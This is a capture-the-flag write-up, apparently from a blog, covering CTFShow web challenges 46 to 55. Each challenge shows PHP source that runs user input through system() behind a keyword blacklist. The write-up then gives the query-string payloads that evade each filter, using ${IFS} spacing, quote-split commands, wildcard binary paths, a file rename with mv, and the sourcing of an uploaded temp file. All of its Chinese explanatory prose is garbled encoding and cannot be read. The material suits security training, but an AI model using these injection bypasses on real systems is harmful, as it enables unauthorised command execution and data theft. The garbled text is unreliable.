<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Š å¤š è¿‡æ»¤äº† <strong>æ•°å­—</strong>ï¼Œ**$**, *****,å› æ­¤éœ€è¦ç»•è¿‡è¿™äº›:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// &lt;</span></span><br><span class="line"><span class="comment">// &lt;&gt; å‡å¯ä»£æ›¿ç©ºæ ¼</span></span><br><span class="line">?c=tac%<span class="number">09</span>f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web46.png"></p>
<h2 id="web47â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web47â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web47â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web47â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜çš„åŸºç¡€ä¸Š å¤š è¿‡æ»¤äº† <strong>more, less, head, sort, tail</strong> å”¯ç‹¬è¿˜æ˜¯æ²¡æœ‰è¿‡æ»¤ tac:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=tac%<span class="number">09</span>f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=nl&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line"><span class="comment">// nl æ˜¾ç¤ºè¡Œå·ï¼Œéœ€è¦æŸ¥çœ‹æºä»£ç </span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web47.png"></p>
<h2 id="web48â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web48â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web48â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web48â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç ;</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜ å¤š è¿‡æ»¤äº† <strong>sed, cut, awk, strings, od, curl `</strong> è¿™äº›æ˜¯å•¥ç©æ„å„¿MD: è‡ªè¡Œç™¾åº¦</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=tac&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac%<span class="number">09</span>f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=nl%<span class="number">09</span>f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=sor<span class="string">&#x27;&#x27;</span>t&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=hea<span class="string">&#x27;&#x27;</span>d&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | || <span class="comment">// headé»˜è®¤æ˜¾ç¤ºåè¡Œ</span></span><br><span class="line">â€¦â€¦â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web48.png"></p>
<h2 id="web49â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web49â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web49â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web49â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸Šä¸€é¢˜ å¤š è¿‡æ»¤äº† <strong>%</strong>: æ–¹æ³•åŒä¸Š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=tac%<span class="number">09</span>f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=tac&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">?c=nl&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | %<span class="number">26</span> | ||</span><br><span class="line">â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web49.png"></p>
<h2 id="web50â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web50â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web50â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web50â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜ å¤š è¿‡æ»¤äº† <strong>\x09:åå…­è¿›åˆ¶09, \x26:åå…­è¿›åˆ¶26</strong> å³è¿‡æ»¤äº† <strong>%09:tab, %26:&amp;</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=tac&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | ||</span><br><span class="line">?c=tac&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | ||</span><br><span class="line">?c=nl&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a</span><br><span class="line">?c=nl&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web50.png"></p>
<h2 id="web51â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web51â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web51â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web51â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜ å¤š è¿‡æ»¤äº† <strong>tac</strong> (ç»ˆäºè¿‡æ»¤äº†tac) ,ä½†ä»»æœªè¿‡æ»¤ <strong>nl</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=t<span class="string">&#x27;&#x27;</span>ac&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | ||</span><br><span class="line">?c=t<span class="string">&#x27;&#x27;</span>ac&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | ||</span><br><span class="line">?c=nl&lt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | ||</span><br><span class="line">?c=nl&lt;&gt;f<span class="string">&#x27;&#x27;</span>lag.php%<span class="number">0</span>a | ||</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web51.png"></p>
<h2 id="web52â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web52â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web52â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web52â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜ å¤šè¿‡æ»¤äº† <strong>&lt; &gt;</strong> ä¸”è§£é™¤äº†å¯¹ <strong>$</strong> çš„è¿‡æ»¤:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=ta<span class="string">&#x27;&#x27;</span>c$&#123;IFS&#125;fla<span class="string">&#x27;&#x27;</span>g.php%<span class="number">0</span>a | ||</span><br><span class="line">?c=ta<span class="string">&#x27;&#x27;</span>c<span class="variable">$IFS</span><span class="string">&#x27;&#x27;</span>fla<span class="string">&#x27;&#x27;</span>g.php%<span class="number">0</span>a | ||</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web52.png"></p>
<p>å‘ç° $flag=â€flag_hereâ€ å¹¶ä¸æ˜¯çœŸæ­£flag; TMD</p>
<p>æ‰«æç›®å½•: </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=ls$&#123;IFS&#125;%<span class="number">0</span>a | ||</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web52_1.png"></p>
<p>å‘ç°å½“å‰ç›®å½•æ²¡åµç”¨ï¼›å†æ‰«ææ ¹ç›®å½•è¯•è¯•</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=ls$&#123;IFS&#125;/%<span class="number">0</span>a | ||</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web52_2.png"></p>
<p>æ­¤æ—¶å‘ç°æ ¹ç›®å½•å‡ºç° <strong>flag</strong>,so:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=ta<span class="string">&#x27;&#x27;</span>c$&#123;IFS&#125;/fl<span class="string">&#x27;&#x27;</span>ag%<span class="number">0</span>a | ||</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web52_3.png"></p>
<h2 id="web53â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"><a href="#web53â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡" class="headerlink" title="web53â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡"></a>web53â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”â‡¡</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æ­¤é¢˜ç›¸è¾ƒäºä¸Šä¸€é¢˜ å¤š è¿‡æ»¤äº† <strong>wget</strong> ; ä¸”æ²¡æœ‰äº†â€œé»‘æ´â€: &gt;/dev/null 2&gt;&amp;1</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=ta<span class="string">&#x27;&#x27;</span>c$&#123;IFS&#125;fl<span class="string">&#x27;&#x27;</span>ag.php</span><br><span class="line">?c=nl$&#123;IFS&#125;fl<span class="string">&#x27;&#x27;</span>ag.php</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web53.png"></p>
<h2 id="web54â€”â€”å‘½ä»¤æ‰§è¡Œ"><a href="#web54â€”â€”å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="web54â€”â€”å‘½ä»¤æ‰§è¡Œ"></a>web54â€”â€”å‘½ä»¤æ‰§è¡Œ</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>è¿™è¿‡æ»¤çš„â€¦â€¦</p>
<p><strong>æ–¹æ³•ä¸€:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// flag.php = 8ä½, f???????</span></span><br><span class="line">?c=/bin/?at$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure>

<p>binä¸ºbinary:ä¸»è¦æ˜¯ç³»ç»Ÿçš„: cat, cp, chmod, dmesg, gzip, kill, ls, mkdir, more, mount, rm, su, tar, ç­‰ç­‰</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web54.png"></p>
<p><strong>æ–¹æ³•äºŒ:</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ä½¿ç”¨ mv å‘½ä»¤å°† flag.php é‡å‘½åä½ a.txt</span></span><br><span class="line">?C=mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</span><br><span class="line">?c=ls</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹ç›®å½•ä¸‹å†…å®¹æ˜¯å¦å°† flag.php æ›´åä½ a.txt</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web54_1.png"></p>
<p>æŸ¥çœ‹ a.txt</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//349624a8-72d7-****-****-4024d09777f4.challenge.ctf.show:8080/a.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web54_2.png"></p>
<h2 id="web55â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ— å­—æ¯æ•°å­—"><a href="#web55â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ— å­—æ¯æ•°å­—" class="headerlink" title="web55â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ— å­—æ¯æ•°å­—"></a>web55â€”â€”å‘½ä»¤æ‰§è¡Œâ€”â€”æ— å­—æ¯æ•°å­—</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 20:03:51</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å‘ç°è¿‡æ»¤äº† : åˆ†å·ï¼Œå­—æ¯a-z, åå¼•å·, %, 09, 26, &lt;&gt; æ—¢ç„¶è¿‡æ»¤äº† å­—æ¯é‚£ä¹ˆ flagå°†ä¸èƒ½ä½¿ç”¨,ç»è¿‡ç™¾åº¦ä¸€é:</p>
<p>éœ€è¦ç¼–å†™ä¸€ä¸ª ç®€å•çš„ä¸Šä¼ é¡µé¢:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>upload<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;TargetURL&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å°† â€œTargetURLâ€ æ›¿æ¢ä¸ºé¢˜ç›®ç¯å¢ƒçš„ URL ä¸Šä¼ ä¸€ä¸ª 1.txt æ–‡ä»¶å…¶å†…å®¹ä¸ºï¼š a</p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web55.png"></p>
<p>ä½¿ç”¨ bp æŠ“åŒ…:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?c=.%<span class="number">20</span>/???/????????[@-[]</span><br><span class="line"><span class="comment">// /tmp/flag.php</span></span><br><span class="line"><span class="comment">// [@-[] ä» @ åˆ° [ ï¼š @ï¼Œ26ä¸ªå¤§å†™å­—æ¯, [ , æ‰€ä»¥è¡¨ç¤º åŒ¹é…å¤§å†™å­—æ¯</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web55_1.png"></p>
<p><img src="/2021/07/22/CTFShow-Web%E7%AC%94%E8%AE%B0/web55_2.png"></p>
